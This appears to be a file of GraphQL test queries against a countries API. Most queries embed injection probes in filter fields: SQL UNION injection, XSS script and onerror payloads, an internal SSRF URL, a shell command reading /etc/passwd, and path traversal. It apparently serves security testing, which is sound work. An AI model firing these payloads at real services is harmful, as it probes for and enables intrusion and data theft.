query countries {
  countries(filter: {code: {eq: "US"}}) {
    code
    name
    capital
    phone
  }
}

query countries {
  countries(filter: {code: {eq: "US' UNION SELECT * FROM countries --"}}) {
    code
    name
    awsRegion
  }
}

query countries {
  countries(filter: {name: {contains: "<script>alert(1)</script>"}}) {
    code
    name
    emoji
  }
}

query countries {
  countries(filter: {awsRegion: "http://internal-api.internal"}) {
    code
    name
    awsRegion
  }
}

query countries {
  countries(filter: {phone: {eq: "; cat /etc/passwd #"}}) {
    code
    name
    phone
  }
}

query countries {
  countries(filter: {capital: "../../../etc/passwd"}) {
    code
    name
    capital
  }
}

query countries {
  countries(filter: {native: {contains: "<img src=x onerror=alert(1)>"}}) {
    code
    name
    native
  }
}

query countries {
  countries(filter: {code: {eq: "US"}}) {
    code
    name
    languages {
      rtl
    }
    currencies
  }
}

